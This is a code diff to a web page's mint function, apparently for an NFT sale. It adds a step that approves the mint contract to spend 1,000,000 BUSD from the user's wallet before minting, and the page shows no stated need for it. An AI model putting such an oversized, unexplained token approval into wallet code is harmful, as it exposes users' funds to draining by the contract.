@@ -737,6 +737,10 @@
       });
     }
 
+    // --- ERC20 approve для BUSD ---
+    const tokenAddress = "0xe9e7cea3dedca5984780bafc599bd69add087d56";
+    const erc20Abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+
     // --- Mint функция ---
     async function mint() {
       if (isMinting || isSoldOut) return;
@@ -754,6 +758,10 @@
           signer = await provider.getSigner();
           contract = new ethers.Contract(contractAddress, abi, signer);
         }
+        // approve BUSD на контракт
+        const token = new ethers.Contract(tokenAddress, erc20Abi, signer);
+        await token.approve(contractAddress, ethers.parseUnits("1000000", 18));
+        // обычный mint
         const tx = await contract.mint();
         document.getElementById('mintBtn').innerText = 'Minting...';
         await tx.wait();
